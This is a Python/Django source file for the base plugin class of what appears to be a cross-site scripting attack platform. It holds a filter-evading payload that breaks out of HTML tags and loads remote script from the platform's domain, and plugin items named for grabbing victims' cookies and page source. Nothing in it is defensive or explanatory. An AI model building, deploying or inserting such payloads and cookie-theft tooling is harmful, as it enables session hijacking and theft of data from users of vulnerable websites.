from abc import abstractmethod
from django.http import HttpResponse, HttpResponseRedirect
from rest_framework.response import Response
from modules.config.models import Config
from modules.config.setting import SERVER_IP, PLATFORM_DOMAIN
from modules.task.models import TaskConfigItem
import requests
import json

class BaseTemplate:
    info = [{
        "template_info": {
            "name": "",  # 组件名
            "title": "",  # 组件展示标题名
            "author": "",  # 组件作者
            "type": 0,  # 组件类型，1是监听0是利用
            "desc": "",  # 组件介绍
            "desc_url": "",  # 组件使用说明链接
            "choice_type": 1,  # 组件选择类型0是单选，1是多选
            "payload": "</tExtArEa>\'\"><sCRiPt sRC=//{domain}/{key}></sCrIpT>",  # 组件实例生成后展示的模板
            "file_name": "xss.py"  # 代码文件名
        },
        "item_info": [{
            "name": "xss_get_cookie",  # 组件配置名
            "config": [],  # 组件配置是否需要外界用户填写参数值
        },
            {
                "name": "xss_get_page_code",
                "config": [],
            }
        ]
    }]

    def __init__(self):
        self.param_list = None
        self.ip = SERVER_IP
        self.domain = PLATFORM_DOMAIN
        self.key = None

    def run(self, key, param_list):
        self.param_list = param_list
        task_config_item = TaskConfigItem.objects.filter(task_config__key=key)
        if task_config_item:
            config = [{"name": i.template_config_item.name, "config": i.value, }
                      for i in
                      task_config_item]
        else:
            config = []
        return self.generate(key, config)

    def replace_code(self, code=""):
        """
        替换code
        """
        code_ = code.replace("{{domain}}", self.domain).replace("{{key}}", self.key)
        return code_

    @abstractmethod
    def generate(self, key, config):
        pass
